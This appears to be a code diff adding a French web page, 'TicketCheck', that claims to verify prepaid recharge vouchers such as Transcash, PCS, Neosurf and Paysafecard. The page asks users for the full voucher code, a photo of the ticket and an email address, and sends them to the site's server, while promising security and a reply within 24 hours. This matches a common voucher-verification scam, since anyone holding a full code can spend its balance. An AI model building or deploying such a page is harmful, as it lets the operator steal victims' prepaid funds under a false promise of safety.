@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TicketCheck — Vérification de tickets de recharge</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --navy:     #042C53;
+  --navy-mid: #0C447C;
+  --navy-lt:  #185FA5;
+  --blue-bg:  #E6F1FB;
+  --blue-mid: #B5D4F4;
+  --green:    #3B6D11;
+  --green-bg: #EAF3DE;
+  --green-mid:#97C459;
+  --red:      #A32D2D;
+  --red-bg:   #FCEBEB;
+  --amber:    #854F0B;
+  --amber-bg: #FAEEDA;
+  --gray-100: #F7F6F3;
+  --gray-200: #ECEAE4;
+  --gray-300: #D3D1C7;
+  --gray-500: #888780;
+  --gray-800: #2C2C2A;
+  --text:     #1a1a18;
+  --text-2:   #5a5957;
+  --text-3:   #9a9895;
+  --radius:   14px;
+  --radius-sm:8px;
+  --shadow:   0 2px 16px rgba(4,44,83,.08);
+  --shadow-lg:0 8px 40px rgba(4,44,83,.14);
+}
+
+body {
+  font-family: 'DM Sans', sans-serif;
+  background: var(--gray-100);
+  color: var(--text);
+  min-height: 100vh;
+  line-height: 1.6;
+}
+
+/* ── Header ── */
+header {
+  background: var(--navy);
+  padding: 0 24px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header-inner {
+  max-width: 900px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 64px;
+}
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-decoration: none;
+}
+.logo-icon {
+  width: 38px; height: 38px;
+  background: rgba(255,255,255,.12);
+  border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px;
+}
+.logo-text { color: #fff; font-size: 18px; font-weight: 600; letter-spacing: -.3px; }
+.logo-sub  { color: rgba(255,255,255,.5); font-size: 12px; }
+.header-badge {
+  background: rgba(255,255,255,.1);
+  color: rgba(255,255,255,.7);
+  font-size: 12px;
+  padding: 4px 12px;
+  border-radius: 20px;
+  border: 1px solid rgba(255,255,255,.15);
+}
+
+/* ── Hero ── */
+.hero {
+  background: linear-gradient(160deg, var(--navy) 0%, var(--navy-mid) 100%);
+  padding: 56px 24px 80px;
+  text-align: center;
+  color: #fff;
+}
+.hero h1 {
+  font-size: clamp(26px,5vw,40px);
+  font-weight: 600;
+  letter-spacing: -.5px;
+  margin-bottom: 12px;
+}
+.hero p {
+  color: rgba(255,255,255,.65);
+  font-size: 16px;
+  max-width: 480px;
+  margin: 0 auto 32px;
+}
+.hero-steps {
+  display: flex;
+  justify-content: center;
+  gap: 32px;
+  flex-wrap: wrap;
+}
+.hero-step {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  color: rgba(255,255,255,.7);
+  font-size: 13px;
+}
+.hero-step-num {
+  width: 24px; height: 24px;
+  background: rgba(255,255,255,.15);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 600; color: #fff;
+}
+
+/* ── Main layout ── */
+.main {
+  max-width: 900px;
+  margin: -40px auto 60px;
+  padding: 0 24px;
+}
+
+/* ── Card ── */
+.card {
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: 32px;
+  margin-bottom: 20px;
+}
+.card-title {
+  font-size: 13px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: .08em;
+  color: var(--text-3);
+  margin-bottom: 20px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.card-title::before {
+  content: '';
+  width: 3px; height: 14px;
+  background: var(--navy-lt);
+  border-radius: 2px;
+  display: inline-block;
+}
+
+/* ── Ticket type selector ── */
+.type-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+  gap: 10px;
+  margin-bottom: 4px;
+}
+.type-btn {
+  border: 1.5px solid var(--gray-200);
+  border-radius: var(--radius-sm);
+  padding: 14px 10px;
+  text-align: center;
+  cursor: pointer;
+  background: var(--gray-100);
+  transition: all .18s;
+  user-select: none;
+}
+.type-btn:hover { border-color: var(--blue-mid); background: var(--blue-bg); }
+.type-btn.active {
+  border-color: var(--navy-lt);
+  background: var(--blue-bg);
+  box-shadow: 0 0 0 3px rgba(24,95,165,.12);
+}
+.type-emoji { font-size: 22px; margin-bottom: 6px; }
+.type-name { font-size: 13px; font-weight: 600; color: var(--text); }
+.type-hint { font-size: 11px; color: var(--text-3); margin-top: 2px; }
+.type-btn.active .type-name { color: var(--navy-lt); }
+
+/* ── Form elements ── */
+.form-group { margin-bottom: 20px; }
+.form-label {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-2);
+  margin-bottom: 8px;
+}
+.form-label .req { color: var(--red); }
+.form-input {
+  width: 100%;
+  padding: 12px 16px;
+  border: 1.5px solid var(--gray-200);
+  border-radius: var(--radius-sm);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 15px;
+  background: var(--gray-100);
+  color: var(--text);
+  transition: border-color .15s, box-shadow .15s;
+  outline: none;
+}
+.form-input:focus {
+  border-color: var(--navy-lt);
+  background: #fff;
+  box-shadow: 0 0 0 3px rgba(24,95,165,.1);
+}
+.form-input::placeholder { color: var(--text-3); }
+.code-input {
+  font-family: 'DM Mono', monospace;
+  font-size: 20px;
+  letter-spacing: 4px;
+  text-align: center;
+  text-transform: uppercase;
+}
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+@media(max-width:520px) { .form-row { grid-template-columns: 1fr; } }
+
+/* ── Upload zone ── */
+.upload-zone {
+  border: 2px dashed var(--gray-300);
+  border-radius: var(--radius-sm);
+  padding: 28px;
+  text-align: center;
+  cursor: pointer;
+  transition: all .18s;
+  background: var(--gray-100);
+  position: relative;
+}
+.upload-zone:hover, .upload-zone.dragover {
+  border-color: var(--navy-lt);
+  background: var(--blue-bg);
+}
+.upload-zone input[type=file] {
+  position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;
+}
+.upload-icon { font-size: 36px; margin-bottom: 8px; color: var(--gray-500); }
+.upload-text { font-size: 14px; color: var(--text-2); font-weight: 500; }
+.upload-hint { font-size: 12px; color: var(--text-3); margin-top: 4px; }
+.upload-preview {
+  display: none;
+  position: relative;
+  border-radius: var(--radius-sm);
+  overflow: hidden;
+}
+.upload-preview img {
+  width: 100%; max-height: 280px;
+  object-fit: contain;
+  background: var(--gray-100);
+  display: block;
+}
+.upload-remove {
+  position: absolute; top: 8px; right: 8px;
+  width: 28px; height: 28px;
+  background: rgba(0,0,0,.5); color: #fff;
+  border: none; border-radius: 50%;
+  cursor: pointer; font-size: 16px; line-height: 28px;
+  display: flex; align-items: center; justify-content: center;
+}
+
+/* ── Submit button ── */
+.btn-submit {
+  width: 100%;
+  padding: 16px;
+  background: var(--navy);
+  color: #fff;
+  border: none;
+  border-radius: var(--radius-sm);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  transition: background .15s, transform .1s;
+  letter-spacing: -.2px;
+}
+.btn-submit:hover { background: var(--navy-mid); }
+.btn-submit:active { transform: scale(.99); }
+.btn-submit:disabled { background: var(--gray-300); cursor: not-allowed; transform: none; }
+.spinner {
+  width: 18px; height: 18px;
+  border: 2.5px solid rgba(255,255,255,.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin .7s linear infinite;
+  display: none;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── Result box ── */
+.result-box {
+  display: none;
+  border-radius: var(--radius-sm);
+  padding: 20px 22px;
+  margin-top: 20px;
+}
+.result-box.success { background: var(--green-bg); border: 1px solid #C0DD97; }
+.result-box.error   { background: var(--red-bg);   border: 1px solid #F7C1C1; }
+.result-box.info    { background: var(--blue-bg);  border: 1px solid var(--blue-mid); }
+.result-title {
+  font-size: 15px;
+  font-weight: 600;
+  margin-bottom: 4px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.result-box.success .result-title { color: var(--green); }
+.result-box.error   .result-title { color: var(--red); }
+.result-box.info    .result-title { color: var(--navy-lt); }
+.result-msg { font-size: 14px; }
+.result-box.success .result-msg { color: #3B6D11; }
+.result-box.error   .result-msg { color: #791F1F; }
+.result-box.info    .result-msg { color: #185FA5; }
+.ref-badge {
+  display: inline-block;
+  background: #fff;
+  border: 1px solid var(--blue-mid);
+  color: var(--navy);
+  font-family: 'DM Mono', monospace;
+  font-size: 15px;
+  font-weight: 500;
+  padding: 6px 16px;
+  border-radius: 6px;
+  margin-top: 10px;
+  letter-spacing: 2px;
+}
+
+/* ── Status checker ── */
+.status-row {
+  display: flex;
+  gap: 10px;
+  align-items: stretch;
+}
+.status-row .form-input { flex: 1; }
+.btn-status {
+  padding: 12px 20px;
+  background: var(--navy);
+  color: #fff;
+  border: none;
+  border-radius: var(--radius-sm);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  white-space: nowrap;
+  transition: background .15s;
+}
+.btn-status:hover { background: var(--navy-mid); }
+
+/* ── Status badge ── */
+.status-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 14px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 600;
+}
+.status-badge.pending  { background: var(--amber-bg);  color: var(--amber); }
+.status-badge.approved { background: var(--green-bg);  color: var(--green); }
+.status-badge.rejected { background: var(--red-bg);    color: var(--red); }
+.status-dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; }
+
+/* ── Info sidebar ── */
+.info-cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 14px;
+  margin-bottom: 20px;
+}
+.info-card {
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: 20px;
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+}
+.info-card-icon {
+  width: 40px; height: 40px;
+  border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px;
+  flex-shrink: 0;
+}
+.info-card-icon.blue  { background: var(--blue-bg); }
+.info-card-icon.green { background: var(--green-bg); }
+.info-card-icon.amber { background: var(--amber-bg); }
+.info-card h3 { font-size: 13px; font-weight: 600; margin-bottom: 3px; }
+.info-card p  { font-size: 12px; color: var(--text-2); line-height: 1.5; }
+
+footer {
+  text-align: center;
+  padding: 24px;
+  color: var(--text-3);
+  font-size: 13px;
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <a class="logo" href="/">
+      <div class="logo-icon">🎫</div>
+      <div>
+        <div class="logo-text">TicketCheck</div>
+        <div class="logo-sub">Vérification de tickets</div>
+      </div>
+    </a>
+    <div class="header-badge">🔒 Service sécurisé</div>
+  </div>
+</header>
+
+<div class="hero">
+  <h1>Vérifiez votre ticket de recharge</h1>
+  <p>Transcash, PCS, Neosurf, Paysafecard et plus — réponse par email sous 24h.</p>
+  <div class="hero-steps">
+    <div class="hero-step"><div class="hero-step-num">1</div> Choisissez le type</div>
+    <div class="hero-step"><div class="hero-step-num">2</div> Saisissez le code</div>
+    <div class="hero-step"><div class="hero-step-num">3</div> Envoyez l'image</div>
+    <div class="hero-step"><div class="hero-step-num">4</div> Recevez la réponse</div>
+  </div>
+</div>
+
+<div class="main">
+
+  <!-- Info cards -->
+  <div class="info-cards">
+    <div class="info-card">
+      <div class="info-card-icon blue">📧</div>
+      <div><h3>Réponse par email</h3><p>Notre équipe vérifie et vous répond rapidement sur votre adresse email.</p></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-icon green">🔐</div>
+      <div><h3>100 % sécurisé</h3><p>Vos informations sont chiffrées et votre code masqué dans notre système.</p></div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-icon amber">⚡</div>
+      <div><h3>Traitement rapide</h3><p>Demandes traitées dans les meilleurs délais, 7j/7.</p></div>
+    </div>
+  </div>
+
+  <!-- Formulaire principal -->
+  <div class="card">
+    <div class="card-title">Nouvelle demande de vérification</div>
+
+    <form id="verifyForm" novalidate>
+
+      <!-- Type de ticket -->
+      <div class="form-group">
+        <div class="form-label">Type de ticket <span class="req">*</span></div>
+        <div class="type-grid">
+          <div class="type-btn active" data-type="transcash" onclick="selectType(this)">
+            <div class="type-emoji">💳</div>
+            <div class="type-name">Transcash</div>
+            <div class="type-hint">16 chiffres</div>
+          </div>
+          <div class="type-btn" data-type="pcs" onclick="selectType(this)">
+            <div class="type-emoji">🏦</div>
+            <div class="type-name">PCS</div>
+            <div class="type-hint">16 chiffres</div>
+          </div>
+          <div class="type-btn" data-type="neosurf" onclick="selectType(this)">
+            <div class="type-emoji">🌊</div>
+            <div class="type-name">Neosurf</div>
+            <div class="type-hint">10 chiffres</div>
+          </div>
+          <div class="type-btn" data-type="paysafecard" onclick="selectType(this)">
+            <div class="type-emoji">🛡️</div>
+            <div class="type-name">Paysafecard</div>
+            <div class="type-hint">16 chiffres</div>
+          </div>
+          <div class="type-btn" data-type="flexepin" onclick="selectType(this)">
+            <div class="type-emoji">⚡</div>
+            <div class="type-name">Flexepin</div>
+            <div class="type-hint">16 chiffres</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Code du ticket -->
+      <div class="form-group">
+        <label class="form-label" for="ticketCode">Code du ticket <span class="req">*</span></label>
+        <input class="form-input code-input" type="text" id="ticketCode" name="ticket_code"
+               placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off"
+               oninput="formatCode(this)" required/>
+      </div>
+
+      <!-- Informations client -->
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label" for="clientName">Votre nom</label>
+          <input class="form-input" type="text" id="clientName" name="client_name"
+                 placeholder="Jean Dupont"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="clientEmail">Votre email <span class="req">*</span></label>
+          <input class="form-input" type="email" id="clientEmail" name="client_email"
+                 placeholder="votre@email.com" required/>
+        </div>
+      </div>
+
+      <!-- Upload image -->
+      <div class="form-group">
+        <div class="form-label">Photo du ticket <span class="req">*</span></div>
+        <div class="upload-zone" id="uploadZone"
+             ondragover="handleDrag(event,true)" ondragleave="handleDrag(event,false)" ondrop="handleDrop(event)">
+          <input type="file" id="ticketImage" name="ticket_image"
+                 accept="image/jpeg,image/png,image/webp,image/gif" onchange="handleFile(this.files[0])"/>
+          <div id="uploadPlaceholder">
+            <div class="upload-icon">📷</div>
+            <div class="upload-text">Cliquez ou glissez l'image ici</div>
+            <div class="upload-hint">JPG, PNG, WEBP — max 10 Mo</div>
+          </div>
+          <div class="upload-preview" id="uploadPreview">
+            <img id="previewImg" src="" alt="Aperçu du ticket"/>
+            <button type="button" class="upload-remove" onclick="removeImage(event)">✕</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bouton -->
+      <button type="submit" class="btn-submit" id="submitBtn">
+        <div class="spinner" id="spinner"></div>
+        <span id="btnText">📤 Envoyer ma demande</span>
+      </button>
+
+      <!-- Résultat -->
+      <div class="result-box" id="resultBox">
+        <div class="result-title" id="resultTitle"></div>
+        <div class="result-msg"  id="resultMsg"></div>
+        <div id="resultRef"></div>
+      </div>
+
+    </form>
+  </div>
+
+  <!-- Suivi de statut -->
+  <div class="card">
+    <div class="card-title">Suivre ma demande</div>
+    <p style="font-size:14px;color:var(--text-2);margin-bottom:16px;">
+      Entrez votre numéro de référence reçu par email pour consulter l'état de votre demande.
+    </p>
+    <div class="status-row">
+      <input class="form-input" type="text" id="refInput"
+             placeholder="Ex : A3F72B1C" maxlength="8" style="font-family:'DM Mono',monospace;letter-spacing:2px;text-transform:uppercase"
+             oninput="this.value=this.value.toUpperCase()"/>
+      <button class="btn-status" onclick="checkStatus()">Vérifier le statut</button>
+    </div>
+    <div class="result-box" id="statusBox" style="margin-top:16px;"></div>
+  </div>
+
+</div>
+
+<footer>
+  © 2024 TicketCheck — Vérification sécurisée de tickets de recharge
+</footer>
+
+<script>
+let selectedType = 'transcash';
+const typeLens = { transcash:16, pcs:16, neosurf:10, paysafecard:16, flexepin:16 };
+
+function selectType(el) {
+  document.querySelectorAll('.type-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  selectedType = el.dataset.type;
+  const inp = document.getElementById('ticketCode');
+  const len = typeLens[selectedType];
+  inp.maxLength = len === 10 ? 12 : 19;
+  inp.placeholder = len === 10 ? '0000 0000 00' : '0000 0000 0000 0000';
+  inp.value = '';
+}
+
+function formatCode(inp) {
+  let val = inp.value.replace(/\D/g,'');
+  val = val.slice(0, typeLens[selectedType]);
+  val = val.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  inp.value = val;
+}
+
+// ── Upload ──────────────────────────────────────────────────
+function handleDrag(e, over) {
+  e.preventDefault();
+  document.getElementById('uploadZone').classList.toggle('dragover', over);
+}
+function handleDrop(e) {
+  e.preventDefault();
+  document.getElementById('uploadZone').classList.remove('dragover');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file);
+}
+function handleFile(file) {
+  if (!file || !file.type.startsWith('image/')) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    document.getElementById('previewImg').src = e.target.result;
+    document.getElementById('uploadPlaceholder').style.display = 'none';
+    document.getElementById('uploadPreview').style.display = 'block';
+    // Store file on input
+    const dt = new DataTransfer();
+    dt.items.add(file);
+    document.getElementById('ticketImage').files = dt.files;
+  };
+  reader.readAsDataURL(file);
+}
+function removeImage(e) {
+  e.stopPropagation();
+  document.getElementById('previewImg').src = '';
+  document.getElementById('uploadPlaceholder').style.display = 'block';
+  document.getElementById('uploadPreview').style.display = 'none';
+  document.getElementById('ticketImage').value = '';
+}
+
+// ── Formulaire ───────────────────────────────────────────────
+document.getElementById('verifyForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const code  = document.getElementById('ticketCode').value.replace(/\s/g,'');
+  const email = document.getElementById('clientEmail').value.trim();
+  const img   = document.getElementById('ticketImage').files[0];
+
+  // Validation
+  if (!code || code.length < typeLens[selectedType]) {
+    return showResult('resultBox','error','⚠️ Code incomplet','Veuillez saisir le code complet du ticket.');
+  }
+  if (!email) {
+    return showResult('resultBox','error','⚠️ Email requis','Veuillez indiquer votre adresse email.');
+  }
+  if (!img) {
+    return showResult('resultBox','error','⚠️ Image requise','Veuillez joindre une photo de votre ticket.');
+  }
+
+  // Loading
+  const btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  document.getElementById('spinner').style.display = 'block';
+  document.getElementById('btnText').textContent = 'Envoi en cours...';
+  document.getElementById('resultBox').style.display = 'none';
+
+  const formData = new FormData();
+  formData.append('ticket_type',  selectedType);
+  formData.append('ticket_code',  code.toUpperCase());
+  formData.append('client_email', email);
+  formData.append('client_name',  document.getElementById('clientName').value.trim());
+  formData.append('ticket_image', img);
+
+  try {
+    const res  = await fetch('/api/verify', { method: 'POST', body: formData });
+    const data = await res.json();
+
+    if (data.success) {
+      showResult('resultBox','success',
+        '✅ Demande envoyée avec succès !',
+        `Votre demande a bien été reçue. Notre équipe va vérifier votre ticket et vous enverra la réponse sur <strong>${email}</strong>.`
+      );
+      document.getElementById('resultRef').innerHTML =
+        `<div style="margin-top:10px;font-size:13px;color:var(--navy-mid);">Votre référence :</div>
+         <div class="ref-badge">${data.reference}</div>`;
+      document.getElementById('verifyForm').reset();
+      removeImage(new Event('click'));
+      document.querySelectorAll('.type-btn').forEach(b => b.classList.remove('active'));
+      document.querySelector('[data-type="transcash"]').classList.add('active');
+      selectedType = 'transcash';
+    } else {
+      showResult('resultBox','error','❌ Erreur', data.error || 'Une erreur est survenue.');
+    }
+  } catch(err) {
+    showResult('resultBox','error','❌ Erreur de connexion','Impossible de joindre le serveur. Vérifiez votre connexion et réessayez.');
+  }
+
+  btn.disabled = false;
+  document.getElementById('spinner').style.display = 'none';
+  document.getElementById('btnText').textContent = '📤 Envoyer ma demande';
+});
+
+// ── Statut ───────────────────────────────────────────────────
+async function checkStatus() {
+  const ref = document.getElementById('refInput').value.trim().toUpperCase();
+  if (ref.length < 6) {
+    return showResult('statusBox','error','⚠️ Référence invalide','Saisissez votre numéro de référence (8 caractères).');
+  }
+  try {
+    const res  = await fetch(`/api/status/${ref}`);
+    const data = await res.json();
+    if (!res.ok) return showResult('statusBox','error','❌ Non trouvé', data.error || 'Référence introuvable.');
+
+    const statusLabels = { pending:'En attente', approved:'Validé ✅', rejected:'Rejeté ❌' };
+    const statusClasses = { pending:'pending', approved:'approved', rejected:'rejected' };
+    const detail = data.status === 'approved'
+      ? `${data.amount ? `<strong>Montant : ${data.amount}</strong><br>` : ''}${data.admin_note ? `Note : ${data.admin_note}` : 'Votre ticket est valide.'}`
+      : data.status === 'rejected'
+      ? `${data.admin_note ? `Motif : ${data.admin_note}` : 'Votre ticket n\'a pas pu être validé.'}`
+      : 'Notre équipe traite votre demande. Vous recevrez une réponse par email très prochainement.';
+
+    document.getElementById('statusBox').style.display = 'block';
+    document.getElementById('statusBox').className = 'result-box ' + (data.status==='approved'?'success':data.status==='rejected'?'error':'info');
+    document.getElementById('statusBox').innerHTML = `
+      <div class="result-title">Demande #${ref}
+        <span class="status-badge ${statusClasses[data.status]}"><span class="status-dot"></span>${statusLabels[data.status]||data.status}</span>
+      </div>
+      <div class="result-msg" style="margin-top:8px">${detail}</div>
+      <div style="margin-top:10px;font-size:12px;color:var(--text-3)">Soumis le ${new Date(data.created_at).toLocaleString('fr-FR')}</div>
+    `;
+  } catch(e) {
+    showResult('statusBox','error','❌ Erreur','Impossible de récupérer le statut. Réessayez.');
+  }
+}
+
+function showResult(id, type, title, msg) {
+  const box = document.getElementById(id);
+  box.style.display = 'block';
+  box.className = 'result-box ' + type;
+  document.getElementById(id.replace('Box','Title') || 'resultTitle').textContent = title;
+  document.getElementById(id.replace('Box','Msg')   || 'resultMsg').innerHTML   = msg;
+  if (id === 'resultBox') document.getElementById('resultRef').innerHTML = '';
+  box.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+</script>
+</body>
+</html>
